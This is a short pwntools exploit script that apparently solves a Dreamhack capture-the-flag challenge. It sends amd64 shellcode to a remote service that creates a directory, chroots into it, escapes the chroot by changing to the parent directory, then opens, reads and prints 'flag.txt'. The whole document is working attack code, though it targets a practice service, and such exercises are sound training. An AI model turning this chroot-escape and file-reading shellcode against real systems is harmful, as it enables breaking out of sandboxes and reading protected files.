from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

p = remote('host3.dreamhack.games', 13008)


shellcode = asm('''
    mov rax, 0x796d6d7564
    push rax
    mov rdi, rsp
    mov rsi, 0755
    mov rax, 83
    syscall

    mov rdi, rsp
    mov rax, 161
    syscall

    add rsp, 8
    
    push 0x2e2e
    mov rdi, rsp

    mov rax, 80
    syscall

    mov rax, 80
    syscall

    add rsp, 8
    
    push 0x0
    mov rax, 0x7478742e67616c66
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall
''')

p.sendlineafter(b'> ', shellcode)
p.interactive()
p.close()